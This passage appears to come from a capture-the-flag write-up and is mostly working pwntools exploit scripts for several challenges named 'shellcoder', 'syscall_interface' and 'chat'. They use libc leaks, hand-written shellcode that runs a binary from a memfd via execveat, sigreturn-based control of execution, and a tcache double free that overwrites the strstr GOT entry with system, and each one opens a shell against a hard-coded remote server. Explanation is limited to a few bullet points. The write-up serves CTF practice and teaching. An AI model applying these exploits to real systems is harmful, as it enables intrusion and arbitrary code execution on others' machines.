try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def new(size,padding,option,data=""):
  r.recvuntil("ice: ")
  r.sendline("0")
  r.recvuntil(": ")
  r.sendline(str(size))
  r.recvuntil(": ")
  r.sendline(str(padding))
  r.recvuntil(": ")
  r.sendline(str(option))
  if option == 1:
    r.recvuntil(": ")
    r.send(data)
  pass


if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  r.recvuntil(": \n")
  r.send("A"*0x18)
  r.recvuntil("A"*0x18)
  libc = u64(r.recv(6).ljust(8,"\x00")) - 0x6d6b2
  print("libc = {}".format(hex(libc)))
  for i in xrange(0x17):
    new(0x2000,1024,0)
  new(0x2000,950,0)
  new(0x5e0,0,0)
  new(0x10e0,0,0)
  new(0xff0,0,0)
  new(0xfd0,0,1,"A"*0xfc0)
  payload = (p64(0)*6 + p64(libc + 0x3ac000) + p64(0) + p64(0x3fff000)*2 + p32(0) + p32(3) + 
      p64(0)*10 + p64(libc + 0x3abd50) + "\x00"*0x840 + "\x07"*0x40 + p64(libc + 0x3aac10))
  time.sleep(1)
  r.send(payload)
  new(8,0,1,p64(libc+0xdea81))
  r.recvuntil("ice: ")
  r.sendline("0")
  r.recvuntil(": ")
  raw_input("@")
  r.sendline("1")
  r.interactive()


```

### shellcoder
* 7 arbitrary bytes(expect null byte) to read larger shellcode
* sys_memfd_create to create a memfd and write a whole static link elf binary to fd
* stub_execveat to exec from fd to search directory and print flag



```python
from pwn import *

#r = process(["./shellcoder"])
r = remote("139.180.215.222", 20002)


context.arch = "amd64"


r.sendafter(":",asm("""
push rdi
pop rsi
xchg edi,edx
syscall
nop
"""))


#syscall(SYS_execveat, exec_fd, "", argv, NULL, AT_EMPTY_PATH);

r.send("\x90"*0x30+asm(shellcraft.pushstr("billy"))+asm("""
mov rax,319
mov rdi,rsp
mov rsi,0
syscall
mov rbx,rax
loop:
mov rdi,0
mov rsi,rsp
mov rdx,0x400
mov rax,0
syscall
cmp rax,0
je go
mov rdi,rbx
mov rsi,rsp
mov rdx,rax
mov rax,1
syscall
jmp loop
go:
mov rdi,rbx
push 0
mov rsi,rsp
xor rdx,rdx
xor r10,r10
mov r8,0x1000
mov rax,322
syscall
"""))

r.recvrepeat(1)
r.send(open("find_flag").read()) # another binary we want to execute
r.shutdown("send")

r.interactive()


```
* find_flag source code

```c=
#include <dirent.h>
#include <errno.h>
#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
char buf[0x100];
void listdir(char* p){

        chdir(p);
        DIR *dir;
        struct dirent *entry;
        dir = opendir(".");
        while ((entry = readdir(dir)) != NULL){
                if( strcmp(entry->d_name,"flag") == 0){
                        puts("Find flag");
                        int fd = open("./flag",0);
                        int n = read(fd,buf,0x100);
                        write(1,buf,n);
                        _exit(0);
                } else if( entry->d_type == DT_DIR){
                         if( strcmp(entry->d_name,".") && strcmp(entry->d_name,".."))
                                listdir(entry->d_name);
                } else {
                }
        }
        closedir(dir);
        chdir("..");
}



int main() {
        listdir("flag");
}


```
### syscall_interface
* sys_personality set flag READ_IMPLIES_EXEC on
* sys_brk get heap address
* leave some shellcode on heap by printf
* update username and sys_rt_sigreturn to let me control RIP
* Read more shellcode and get shell

```python
from pwn import *
context.arch = 'amd64'

data = [0x0]*16
#r = process(["./syscall_interface"])
r = remote("139.180.144.86", 20004)
#r = remote("localhost",4444)
r.sendafter("choice:","0".ljust(0xf,'\x00'))
r.sendafter(":","135".ljust(0xf,'\x00'))
r.sendafter(":",str(0x400000).ljust(0x1f,'\x00'))

r.sendafter("choice:","0".ljust(0xf,'\x00'))
r.sendafter(":","12".ljust(0xf,'\x00'))
r.sendafter(":",str(0x0).ljust(0x1f,'\x00'))

r.recvuntil("RET(")
heap = int(r.recvuntil(")")[:-1],16)-0x22000
print hex(heap)


data[0] = u64(asm("push rsp;pop rsi;syscall").ljust(8,'\x90'))
data[2] = 0x200

data[5] = heap+0x8
data[6] = heap+0x40
data[0x8] = 0x002b000000000033


payload = flat(data)[:0x7f]
r.sendafter(":","1".ljust(0xf,'\x00'))
r.sendafter(":",payload)

r.sendafter("choice:","0".ljust(0xf,'\x00'))
r.sendafter(":","12".ljust(0xf,'\x00'))
r.sendafter(":",str(0x0).ljust(0x1f,'\x00'))

r.sendafter("choice:","0".ljust(0xf,'\x00'))
r.sendafter(":","15".ljust(0xf,'\x00'))

r.sendafter(":",str(0x0).ljust(0x1f,'\x00'))
r.send("\x90"*0x50+asm("add rsp,0x500")+asm(shellcraft.sh()))

r.interactive()


```
### chat
* Leave some heap layout on bss for later free
* Leak libc address by first say
* Because name_ptr is not been reset after sync, somehow we can control name_ptr's content
* double free bss by modify name
* Tcache Attack to modify strstr got entry to system
* Get shell


```python
from pwn import *


#r = process(["./chat"],env={"LD_PRELOAD":"./libc-2.27.so"})
r = remote("106.52.252.82", 20005)
r.recvuntil("name: ")
context.arch = "amd64"

data = flat(0x0,0x21,0,0,0,0x21,0,0,0,0x21)

r.sendline("AAAA".ljust(0x10,'\x00')+data)


r.recvuntil("help\n==========================================\n")
time.sleep(0.1)
r.send("enter " + "D"*0x30)
time.sleep(0.1)

import struct

val =  struct.pack("<q",-0x21a350)+"\x00"
r.send("say "+val)
r.recvuntil("AAAA: ")
r.sendline("")
r.recvuntil("AAAA: ")
libc = u64(r.recvline()[:-1].ljust(8,'\x00'))- 0x3ebca0

print hex(libc)


val =  struct.pack("<q",-0x21a350)+"\x00"
r.send("say "+val)

val =  struct.pack("<q",-0x215010)
time.sleep(0.1)
r.send("modify " + val*4+p64(0x603140+0x20)[:-1])  # <= name ptr   UAF
time.sleep(0.1)
r.send("modify " + "A"*0x50)
time.sleep(0.1)
r.sendline("")
time.sleep(0.1)
r.sendline("")
time.sleep(0.1)
r.send("modify " + p64(0x0603058))

time.sleep(0.1)
r.send("say AAAA")
time.sleep(0.1)
r.send("say "+p64(libc+0x4f440)[:-1])
time.sleep(0.1)
r.send("/bin/sh\x00")
r.interactive()


```
